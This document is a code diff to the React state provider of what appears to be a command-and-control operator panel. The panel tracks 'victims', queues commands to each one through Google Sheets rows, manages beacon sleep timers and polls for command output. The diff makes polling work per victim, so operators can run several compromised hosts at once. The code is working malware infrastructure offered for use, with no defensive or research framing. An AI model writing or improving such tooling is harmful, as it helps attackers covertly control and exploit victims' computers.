@@ -30,7 +30,7 @@ export function AppProvider({ children }) {
 
   const [victims, setVictims]           = useState([]);
   const [activeVictim, setActiveVictim] = useState(null);
-  const [rows, setRows]                 = useState([]);
+  const [rowsByVictim, setRowsByVictim] = useState({});
   const [loading, setLoading]           = useState(false);
   const [error, setError]               = useState(null);
   const [ticker, setTicker]             = useState(60);
@@ -39,19 +39,30 @@ export function AppProvider({ children }) {
   const [showSettings, setShowSettings] = useState(false);
   const [sleepStatus, setSleepStatus]   = useState({});
   const [victimStatus, setVictimStatus] = useState({});
-  // ── Smart polling state ───────────────────────────────────────────────────
-  // pendingRow: the rowIndex we're waiting for a beacon response on
-  const [pendingRow, setPendingRow]     = useState(null);
-  const [polling, setPolling]           = useState(false);
-  const pollTimerRef  = useRef(null);
-  const pollCountRef  = useRef(0);
-  const onPollOutputRef = useRef(null);
+  // Per-victim: rowIndex we are waiting on (victim can poll while another is selected)
+  const [pollingByVictim, setPollingByVictim] = useState({});
+  const pollTimersRef = useRef({});
+  const pollCountByVictimRef = useRef({});
+  const pollCallbacksRef = useRef({});
   const sleepWakeTimersRef = useRef({});
   const activeVictimRef = useRef(activeVictim);
   const victimsRef = useRef(victims);
+  const rowsByVictimRef = useRef(rowsByVictim);
   const quotaPausedUntilRef = useRef(0);
+  const statusProbeRunningRef = useRef(false);
+
+  const victimKey = (id) => String(id);
+  const activeRows = activeVictim
+    ? (rowsByVictim[victimKey(activeVictim.id)] || [])
+    : [];
+  const activePendingRow = activeVictim
+    ? (pollingByVictim[victimKey(activeVictim.id)] ?? null)
+    : null;
+  const activePolling = activePendingRow != null;
+
   useEffect(() => { activeVictimRef.current = activeVictim; }, [activeVictim]);
   useEffect(() => { victimsRef.current = victims; }, [victims]);
+  useEffect(() => { rowsByVictimRef.current = rowsByVictim; }, [rowsByVictim]);
 
   const isQuotaPaused = useCallback(() => Date.now() < quotaPausedUntilRef.current, []);
 
@@ -106,8 +117,10 @@ export function AppProvider({ children }) {
         params: { sheetName: victim.title },
       });
       const fetched = res.data.rows || [];
-      setRows(fetched);
-      setLastRefresh(new Date());
+      setRowsByVictim((prev) => ({ ...prev, [victimKey(victim.id)]: fetched }));
+      if (victimKey(activeVictimRef.current?.id) === victimKey(victim.id)) {
+        setLastRefresh(new Date());
+      }
       setVictimOnline(victim.id, true);
       setSleepStatus((prev) => {
         const sleepEntry = prev[victim.id];
@@ -175,51 +188,63 @@ export function AppProvider({ children }) {
     }
   }, [isConfigured, fetchRowsRaw, isQuotaPaused, handleQuotaError]);
 
-  // ── Stop any in-progress poll ─────────────────────────────────────────────
-  const stopPolling = useCallback(() => {
-    if (pollTimerRef.current) {
-      clearInterval(pollTimerRef.current);
-      pollTimerRef.current = null;
+  const stopPollingForVictim = useCallback((victimId) => {
+    const key = String(victimId);
+    if (pollTimersRef.current[key]) {
+      clearInterval(pollTimersRef.current[key]);
+      delete pollTimersRef.current[key];
     }
-    pollCountRef.current = 0;
-    onPollOutputRef.current = null;
-    setPolling(false);
-    setPendingRow(null);
+    delete pollCountByVictimRef.current[key];
+    delete pollCallbacksRef.current[key];
+    setPollingByVictim((prev) => {
+      if (prev[key] == null && prev[victimId] == null) return prev;
+      const next = { ...prev };
+      delete next[key];
+      delete next[victimId];
+      return next;
+    });
   }, []);
 
-  // ── Start smart polling after a command is sent ───────────────────────────
-  // Polls every POLL_INTERVAL_MS and stops as soon as the target row has output.
-  const startPolling = useCallback((targetRowIndex, { onOutput } = {}) => {
-    if (pollTimerRef.current) clearInterval(pollTimerRef.current);
-    pollCountRef.current = 0;
-    onPollOutputRef.current = onOutput || null;
-    setPendingRow(targetRowIndex);
-    setPolling(true);
+  const stopAllPolling = useCallback(() => {
+    Object.keys(pollTimersRef.current).forEach((id) => stopPollingForVictim(id));
+  }, [stopPollingForVictim]);
 
-    pollTimerRef.current = setInterval(async () => {
-      pollCountRef.current += 1;
+  // Polls the victim's sheet until targetRow has output (independent per victim)
+  const startPollingForVictim = useCallback((victimId, targetRowIndex, { onOutput } = {}) => {
+    const key = String(victimId);
+    stopPollingForVictim(key);
 
-      const victim = activeVictimRef.current;
-      if (!victim) { stopPolling(); return; }
+    pollCountByVictimRef.current[key] = 0;
+    pollCallbacksRef.current[key] = onOutput || null;
+    setPollingByVictim((prev) => ({ ...prev, [key]: targetRowIndex }));
+
+    pollTimersRef.current[key] = setInterval(async () => {
+      pollCountByVictimRef.current[key] = (pollCountByVictimRef.current[key] || 0) + 1;
+
+      const victim = victimsRef.current.find((v) => String(v.id) === key);
+      if (!victim) {
+        stopPollingForVictim(key);
+        return;
+      }
       if (isQuotaPaused()) return;
 
       const fetched = await fetchRowsRaw(victim);
 
       if (fetched) {
-        const targetRow = fetched.find(r => r.rowIndex === targetRowIndex);
-        if (targetRow && targetRow.output) {
-          const done = onPollOutputRef.current;
-          stopPolling();
+        const targetRow = fetched.find((r) => r.rowIndex === targetRowIndex);
+        if (targetRow?.output) {
+          const done = pollCallbacksRef.current[key];
+          stopPollingForVictim(key);
           done?.();
           return;
         }
       }
 
-      if (pollCountRef.current >= MAX_POLL_ATTEMPTS) {
-        stopPolling();
+      if (pollCountByVictimRef.current[key] >= MAX_POLL_ATTEMPTS) {
+        stopPollingForVictim(key);
       }
     }, POLL_INTERVAL_MS);
-  }, [fetchRowsRaw, stopPolling, isQuotaPaused]);
+  }, [fetchRowsRaw, stopPollingForVictim, isQuotaPaused]);
 
   const parseSleepDuration = (value) => {
     if (!value) return null;
@@ -249,18 +274,28 @@ export function AppProvider({ children }) {
 
   // ── Send a command ────────────────────────────────────────────────────────
   const sendCommand = useCallback(async (command) => {
-    if (!activeVictimRef.current || !isConfigured) return false;
-    try {
-      // Stop any existing poll for a previous command
-      stopPolling();
+    const victim = activeVictimRef.current;
+    if (!victim || !isConfigured) return false;
 
-      const cmdRows = rows.filter(r => r.command && r.command !== 'Delay configuration (sec)');
+    const victimId = victim.id;
+    const victimKey = String(victimId);
+
+    try {
+      stopPollingForVictim(victimKey);
+
+      const victimRows = rowsByVictimRef.current[victimKey]
+        || rowsByVictimRef.current[victimId]
+        || [];
+      const cmdRows = victimRows.filter(
+        (r) => r.command && r.command !== 'Delay configuration (sec)',
+      );
       const nextRowIndex = cmdRows.length + 1;
       const trimmed = command.trim();
       const sleepCommand = trimmed.toLowerCase().startsWith('sleep ');
       const finishCommand = trimmed.toLowerCase() === 'finish';
       let sleepMs = null;
-      const activeSleep = sleepStatus?.[activeVictimRef.current.id] && new Date(sleepStatus[activeVictimRef.current.id].wakeAt) > new Date();
+      const activeSleep = sleepStatus?.[victimId]
+        && new Date(sleepStatus[victimId].wakeAt) > new Date();
 
       if (finishCommand) {
         setError('Use direct sleep command only, e.g. sleep 00:02:00.');
@@ -277,17 +312,15 @@ export function AppProvider({ children }) {
       }
 
       await axios.post('/api/sheets/command', {
-        sheetName: activeVictimRef.current.title,
+        sheetName: victim.title,
         command,
         rowIndex: nextRowIndex,
       });
 
-      // Immediately refresh once so the sent command shows up
-      await fetchRowsRaw(activeVictimRef.current);
+      await fetchRowsRaw(victim);
 
       if (sleepCommand && sleepMs !== null) {
         const wakeAt = new Date(Date.now() + sleepMs);
-        const victimId = activeVictimRef.current.id;
         setSleepStatus((prev) => ({
           ...prev,
           [victimId]: {
@@ -300,7 +333,7 @@ export function AppProvider({ children }) {
         }));
         setVictimOnline(victimId, true);
       } else if (!activeSleep) {
-        startPolling(nextRowIndex);
+        startPollingForVictim(victimKey, nextRowIndex);
       }
 
       return true;
@@ -308,7 +341,14 @@ export function AppProvider({ children }) {
       setError(e.response?.data?.error || e.message);
       return false;
     }
-  }, [isConfigured, rows, fetchRowsRaw, startPolling, stopPolling, sleepStatus, parseHHMMSS]);
+  }, [
+    isConfigured,
+    fetchRowsRaw,
+    startPollingForVictim,
+    stopPollingForVictim,
+    sleepStatus,
+    parseHHMMSS,
+  ]);
 
   // ── Victims ───────────────────────────────────────────────────────────────
   const fetchVictims = useCallback(async ({ silent = false } = {}) => {
@@ -368,9 +408,15 @@ export function AppProvider({ children }) {
         return next;
       });
 
+      stopPollingForVictim(String(victimId));
+      setRowsByVictim((prev) => {
+        const next = { ...prev };
+        delete next[String(victimId)];
+        delete next[victimId];
+        return next;
+      });
+
       if (String(activeVictimRef.current?.id) === String(victimId)) {
-        stopPolling();
-        setRows([]);
         setActiveVictim(remaining.length > 0 ? remaining[remaining.length - 1] : null);
       }
 
@@ -379,7 +425,7 @@ export function AppProvider({ children }) {
       setError(e.response?.data?.error || e.message);
       return false;
     }
-  }, [isConfigured, stopPolling]);
+  }, [isConfigured, stopPollingForVictim]);
 
   const updateTicker = useCallback(async (value) => {
     if (!activeVictimRef.current || !isConfigured) return;
@@ -422,7 +468,7 @@ export function AppProvider({ children }) {
       if (hasOutput) {
         markSleepReady();
       } else if (isActive && rowIndex) {
-        startPolling(rowIndex, { onOutput: markSleepReady });
+        startPollingForVictim(String(victimId), rowIndex, { onOutput: markSleepReady });
       } else {
         markSleepReady();
       }
@@ -434,7 +480,7 @@ export function AppProvider({ children }) {
       });
       setVictimOnline(victimId, false);
     }
-  }, [isConfigured, fetchRowsForVictim, fetchRowsRaw, setVictimOnline, startPolling]);
+  }, [isConfigured, fetchRowsForVictim, fetchRowsRaw, setVictimOnline, startPollingForVictim]);
 
   // Schedule one timer per victim at wakeAt (replaces coarse 10s polling)
   useEffect(() => {
@@ -484,11 +530,15 @@ export function AppProvider({ children }) {
   }, [isConfigured, fetchVictims]);
 
   useEffect(() => {
-    if (activeVictim) {
-      stopPolling(); // stop polling when switching victims
+    if (!activeVictim) return;
+    const cached = rowsByVictimRef.current[String(activeVictim.id)]
+      ?? rowsByVictimRef.current[activeVictim.id];
+    if (cached) {
+      setLastRefresh(new Date());
+    } else {
       fetchRows(activeVictim);
     }
-  }, [activeVictim?.id]);
+  }, [activeVictim?.id, fetchRows]);
 
   // Auto-refresh (manual toggle)
   useEffect(() => {
@@ -500,15 +550,15 @@ export function AppProvider({ children }) {
     return () => clearInterval(id);
   }, [autoRefresh, ticker, activeVictim, fetchRows, isQuotaPaused]);
 
-  // Cleanup poll on unmount
-  useEffect(() => () => stopPolling(), []);
+  useEffect(() => () => stopAllPolling(), [stopAllPolling]);
 
   return (
     <AppContext.Provider value={{
       config, saveConfig, fetchConfig,
       configLoaded, configError,
       victims, activeVictim, setActiveVictim,
-      rows, fetchRows,
+      rows: activeRows,
+      fetchRows,
       loading,
       error, setError,
       ticker, updateTicker,
@@ -522,8 +572,8 @@ export function AppProvider({ children }) {
       sleepStatus,
       victimStatus,
       parseHHMMSS,
-      // Polling state for UI indicator
-      polling, pendingRow,
+      polling: activePolling,
+      pendingRow: activePendingRow,
       pollIntervalMs: POLL_INTERVAL_MS,
     }}>
       {children}
